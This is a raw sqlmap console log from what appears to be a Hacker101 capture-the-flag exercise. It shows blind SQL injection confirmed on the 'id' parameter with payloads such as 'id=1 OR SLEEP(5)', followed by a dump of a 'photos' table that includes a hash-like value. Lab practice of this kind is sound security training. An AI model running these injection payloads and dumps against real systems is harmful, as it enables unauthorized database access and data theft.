        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.9#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:30:57 /2022-10-16/

[21:30:57] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[21:30:57] [INFO] testing connection to the target URL
[21:30:59] [INFO] testing if the target URL content is stable
[21:31:01] [INFO] target URL content is stable
[21:31:02] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[21:31:08] [INFO] testing for SQL injection on GET parameter 'id'
[21:31:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:31:12] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[21:31:26] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [21:32:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:32:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:32:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:32:43] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[21:32:43] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[21:32:44] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[21:32:45] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[21:32:46] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[21:32:46] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:32:47] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:32:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[21:32:48] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[21:32:49] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[21:32:50] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[21:32:50] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:32:51] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[21:32:51] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[21:32:53] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[21:32:53] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[21:32:59] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[21:33:00] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[21:33:00] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[21:33:01] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[21:33:01] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[21:33:02] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[21:33:03] [INFO] testing 'Generic inline queries'
[21:33:03] [INFO] testing 'MySQL inline queries'
[21:33:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[21:33:04] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[21:33:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[21:33:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[21:33:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[21:33:12] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[21:33:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[21:33:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:33:22] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[21:33:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[21:33:35] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[21:34:01] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' injectable 
[21:34:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:34:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:34:03] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:34:06] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] [21:36:51] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[21:37:08] [INFO] target URL appears to be UNION injectable with 1 columns
[21:37:13] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[21:37:36] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[21:37:50] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[21:38:07] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[21:38:22] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[21:38:34] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[21:38:56] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[21:39:08] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[21:39:22] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[21:39:39] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[21:39:51] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 312 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3491=3491

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
    Payload: id=1 OR SLEEP(5)
---
[21:41:54] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.21.4.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[21:41:57] [INFO] fetching columns for table 'photos' in database 'level5'

[21:41:57] [INFO] retrieved: 4
[21:42:02] [INFO] retrieving the length of query output

[21:42:02] [INFO] retrieved: 2
[21:42:13] [INFO] retrieved: __
[21:42:13] [INFO] retrieved: 
[21:42:26] [INFO] retrieved: id           
[21:42:26] [INFO] retrieved: id
[21:42:26] [INFO] retrieving the length of query output

[21:42:26] [INFO] retrieved: 5
[21:42:33] [INFO] retrieved: _____
[21:42:33] [INFO] retrieved: 
[21:42:46] [INFO] retrieved: title           
[21:42:46] [INFO] retrieved: title
[21:42:46] [INFO] retrieving the length of query output

[21:42:46] [INFO] retrieved: 8
[21:42:59] [INFO] retrieved: ________
[21:42:59] [INFO] retrieved: 
[21:43:12] [INFO] retrieved: filename           
[21:43:12] [INFO] retrieved: filename
[21:43:12] [INFO] retrieving the length of query output

[21:43:12] [INFO] retrieved: 6
[21:43:20] [INFO] retrieved: ______
[21:43:20] [INFO] retrieved: 
[21:43:39] [INFO] retrieved: parent           
[21:43:39] [INFO] retrieved: parent
[21:43:39] [INFO] fetching entries for table 'photos' in database 'level5'
[21:43:39] [INFO] fetching number of entries for table 'photos' in database 'level5'

[21:43:39] [INFO] retrieved: 3
[21:43:47] [INFO] retrieving the length of query output

[21:43:47] [INFO] retrieved: 18
[21:43:59] [INFO] retrieved: __________________
[21:43:59] [INFO] retrieved: 
[21:44:26] [INFO] retrieved: files/adorable.jpg             
[21:44:27] [INFO] retrieved: files/adorable.jpg
[21:44:27] [INFO] retrieving the length of query output

[21:44:27] [INFO] retrieved: 1

[21:44:31] [INFO] retrieved: 1
[21:44:48] [INFO] retrieving the length of query output

[21:44:48] [INFO] retrieved: 1

[21:44:53] [INFO] retrieved: 1
[21:45:01] [INFO] retrieving the length of query output

[21:45:01] [INFO] retrieved: 16
[21:45:18] [INFO] retrieved: ________________
[21:45:18] [INFO] retrieved: 
[21:45:41] [INFO] retrieved: Utterly adorable             
[21:45:41] [INFO] retrieved: Utterly adorable
[21:45:41] [INFO] retrieving the length of query output

[21:45:41] [INFO] retrieved: 18
[21:45:55] [INFO] retrieved: __________________
[21:45:55] [INFO] retrieved: 
[21:46:23] [INFO] retrieved: files/purrfect.jpg             
[21:46:23] [INFO] retrieved: files/purrfect.jpg
[21:46:23] [INFO] retrieving the length of query output

[21:46:23] [INFO] retrieved: 1

[21:46:28] [INFO] retrieved: 2
[21:46:41] [INFO] retrieving the length of query output

[21:46:41] [INFO] retrieved: 1

[21:46:46] [INFO] retrieved: 1
[21:46:54] [INFO] retrieving the length of query output

[21:46:54] [INFO] retrieved: 8
[21:47:03] [INFO] retrieved: ________
[21:47:03] [INFO] retrieved: 
[21:47:22] [INFO] retrieved: Purrfect           
[21:47:22] [INFO] retrieved: Purrfect
[21:47:22] [INFO] retrieving the length of query output

[21:47:22] [INFO] retrieved: 64
[21:47:33] [INFO] retrieved: ________________________________________________________________
[21:47:33] [INFO] retrieved: 
[21:49:05] [INFO] retrieved: 867d7399b09ed94ef7037e540240452914e631f4b6b6349b6e706aee89914f65             
[21:49:05] [INFO] retrieved: 867d7399b09ed94ef7037e540240452914e631f4b6b6349b6e706aee89914f65
[21:49:05] [INFO] retrieving the length of query output

[21:49:05] [INFO] retrieved: 1

[21:49:09] [INFO] retrieved: 3
[21:49:19] [INFO] retrieving the length of query output

[21:49:19] [INFO] retrieved: 1

[21:49:26] [INFO] retrieved: 1
[21:49:39] [INFO] retrieving the length of query output

[21:49:39] [INFO] retrieved: 9
[21:49:47] [INFO] retrieved: _________
[21:49:47] [INFO] retrieved: 
[21:50:06] [INFO] retrieved: Invisible           
[21:50:06] [INFO] retrieved: Invisible
[21:50:06] [INFO] recognized possible password hashes in column 'filename'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] do you want to crack them via a dictionary-based attack? [Y/n/q] Database: level5
Table: photos
[3 entries]
+----+------------------+--------+------------------------------------------------------------------+
| id | title            | parent | filename                                                         |
+----+------------------+--------+------------------------------------------------------------------+
| 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
| 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
| 3  | Invisible        | 1      | 867d7399b09ed94ef7037e540240452914e631f4b6b6349b6e706aee89914f65 |
+----+------------------+--------+------------------------------------------------------------------+

[21:51:07] [INFO] table 'level5.photos' dumped to CSV file '/home/kali/.local/share/sqlmap/output/afcd6b7caf3526e3d2934bfc154504b7.ctf.hacker101.com/dump/level5/photos.csv'
[21:51:07] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 279 times, 404 (Not Found) - 667 times
[21:51:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/afcd6b7caf3526e3d2934bfc154504b7.ctf.hacker101.com'

[*] ending @ 21:51:07 /2022-10-16/

